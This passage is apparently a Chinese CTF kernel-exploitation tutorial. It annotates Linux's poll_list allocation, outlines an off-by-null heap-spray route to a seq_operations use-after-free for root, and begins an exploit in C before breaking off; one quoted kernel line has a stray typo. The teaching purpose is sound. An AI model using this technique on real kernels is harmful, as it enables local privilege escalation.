<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*   @fds: pollfd类型的一个数组</span></span><br><span class="line"><span class="comment">*   @nfds: 前面的参数fds中条目的个数</span></span><br><span class="line"><span class="comment">*   @timeout: 事件发生的毫秒数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>poll_list</code> 结构体对象是在调用 <code>poll()</code> 时分配，该调用可以监视 <code>1</code> 个或多个文件描述符的活动。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">short</span> events;</span><br><span class="line">	<span class="type">short</span> revents;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span> <span class="comment">// 指向下一个poll_list</span></span><br><span class="line">    <span class="type">int</span> len; <span class="comment">// 对应于条目数组中pollfd结构的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span> <span class="comment">// 存储pollfd结构的数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>poll_list</code> 结构如下图所示，前 <code>30</code> 个 <code>poll_fd</code> 在栈上，后面的都在堆上，最多 <code>510</code> 个 <code>poll_fd</code> 在一个堆上的 <code>poll_list</code> 上，堆上的 <code>poll_list</code> 最大为 <code>0x1000</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010143715739.png"
                      alt="image-20241010143715739"
                ></p>
<p><strong>poll_list 分配&#x2F;释放</strong></p>
<p><code>do_sys_poll</code> 函数完成 <code>poll_list</code> 的分配和释放。<code>poll_list</code> 的是超时自动释放的，我们可以指定 <code>poll_list</code> 的释放时间。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_STACK_ALLOC	256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="comment">//(4096-16)/8 = 510(堆上存放pollfd最大数量)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))	</span></span><br><span class="line"><span class="comment">//(256-16)/8 = 30 (栈上存放pollfd最大数量)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / sizeof(struct pollfd))</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_sys_poll</span><span class="params">(<span class="keyword">struct</span> pollfd __user *ufds, <span class="type">unsigned</span> <span class="type">int</span> nfds,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> timespec64 *end_time)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_wqueues</span> <span class="title">table</span>;</span></span><br><span class="line">    <span class="type">int</span> err = -EFAULT, fdcount, len;</span><br><span class="line">    <span class="comment">/* Allocate small arguments on the stack to save memory and be</span></span><br><span class="line"><span class="comment">       faster - use long to make sure the buffer is aligned properly</span></span><br><span class="line"><span class="comment">       on 64 bit archs to avoid unaligned access */</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  [1] stack_pps 256 字节的栈缓冲区, 负责存储前 30 个 pollfd entry</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">long</span> stack_pps[POLL_STACK_ALLOC/<span class="keyword">sizeof</span>(<span class="type">long</span>)]; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">const</span> <span class="title">head</span> =</span> (<span class="keyword">struct</span> poll_list *)stack_pps;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">walk</span> =</span> head;</span><br><span class="line"> 	<span class="type">unsigned</span> <span class="type">long</span> todo = nfds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nfds &gt; rlimit(RLIMIT_NOFILE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	*  [2] 前30个 pollfd entry 先存放在栈上，节省内存和时间</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	len = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, nfds, N_STACK_PPS);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		walk-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		walk-&gt;len = len;</span><br><span class="line">		<span class="keyword">if</span> (!len)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(walk-&gt;entries, ufds + nfds-todo, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) * walk-&gt;len))</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">		todo -= walk-&gt;len;</span><br><span class="line">		<span class="keyword">if</span> (!todo)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 	[3] 如果提交超过30个 pollfd entries，就会把多出来的 pollfd 放在内核堆上。</span></span><br><span class="line"><span class="comment">        * 	每个 page 最多存 POLLFD_PER_PAGE (510) 个entry, </span></span><br><span class="line"><span class="comment">        * 	超过这个数，则分配新的 poll_list, 依次循环直到存下所有传入的 entry</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		len = min(todo, POLLFD_PER_PAGE);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        *   [4] 只要控制好被监控的文件描述符数量，就能控制分配size，从 kmalloc-32 到 kmalloc-4k</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len), GFP_KERNEL); 			</span><br><span class="line">		<span class="keyword">if</span> (!walk) &#123;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	poll_initwait(&amp;table);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 	[5] 分配完 poll_list 对象后，调用 do_poll() 来监控这些文件描述符，直到发生特定 event 或者超时。</span></span><br><span class="line"><span class="comment">    *   这里 end_time 就是最初传给 poll() 的超时变量, 这表示 poll_list 对象可以在内存中保存任意时长，超时后自动释放。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	fdcount = do_poll(head, &amp;table, end_time);  </span><br><span class="line">	poll_freewait(&amp;table);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!user_write_access_begin(ufds, nfds * <span class="keyword">sizeof</span>(*ufds))and)</span><br><span class="line">		<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (walk = head; walk; walk = walk-&gt;next) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">fds</span> =</span> walk-&gt;entries;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (j = walk-&gt;len; j; fds++, ufds++, j--)</span><br><span class="line">			unsafe_put_user(fds-&gt;revents, &amp;ufds-&gt;revents, Efault);</span><br><span class="line">  	&#125;</span><br><span class="line">	user_write_access_end();</span><br><span class="line"></span><br><span class="line">	err = fdcount;</span><br><span class="line">out_fds:</span><br><span class="line">	walk = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (walk) &#123; 		<span class="comment">// [6] 释放 poll_list: 遍历单链表, 释放每一个 poll_list, 这里可以利用</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">pos</span> =</span> walk;</span><br><span class="line">		walk = walk-&gt;next;</span><br><span class="line">		kfree(pos);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">Efault:</span><br><span class="line">	user_write_access_end();</span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> out_fds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以去找到一些结构体，其头 <code>8</code> 字节是一个指针，然后利用 <code>off by null</code> 去损坏该指针，比如使得 <code>0xXXXXa0</code> 变成 <code>0xXXXX00</code>，然后就可以考虑利用堆喷去构造 <code>UAF</code> 了。</p>
<p><strong>详细流程</strong></p>
<ol>
<li><p>首先分配 <code>kmalloc-4096</code> 大小的结构题在<code>ptr[0]</code>；</p>
</li>
<li><p>然后构造这样的<code>poll_list</code>结构体。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png"
                      alt="99a7506313bfd15e5f0821cc7486cfb9"
                ></p>
<ol start="3">
<li><p>利用<code>off-by-null</code>将<code>poll_list-&gt;next</code>的最后一个字节改为空。然后大量分配<code>kmalloc-32</code>的<code>obj</code>内存，这里只所以是 <code>32</code> 字节大小是因为要与后面的 <code>seq_operations</code> 配合，并且 <code>32</code> 大小的 <code>object</code> 其低字节是可能为 <code>\x00</code> 的，其低字节为 <code>0x20</code>、<code>0x40</code>、<code>0x80</code> 、<code>0xa0</code>、<code>0xc0</code>、<code>0xe0</code>、<code>0x00</code>。运气好可以被我们篡改后的<code>poll_list-&gt;next</code>指到。但对于这道题来说我们没有足够的堆块用于堆喷，所以成功率是极低的。	<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png"
                      alt="64bfe90cc041bac53218ddde26656a27"
                ></p>
</li>
<li><p>等待<code>poll_list</code>线程执行完毕，并且我们分配的<code>kmalloc-32</code>被错误释放，分配大量的<code>seq_operations</code>，运气好可以正好被分配到我们释放的<code>kmalloc-32</code>，形成<code>UAF</code>，这样我们就可以利用<code>UAF</code>修改<code>seq_operations-&gt;start</code>指针指向提权代码。</p>
</li>
<li><p>提权可以参考上一篇文章，利用栈上的残留值来<code>bypass kaslr</code>。</p>
</li>
</ol>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_NUM (2048 + 128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_NUM 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> bof_fd;</span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_NUM 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;        <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;         <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 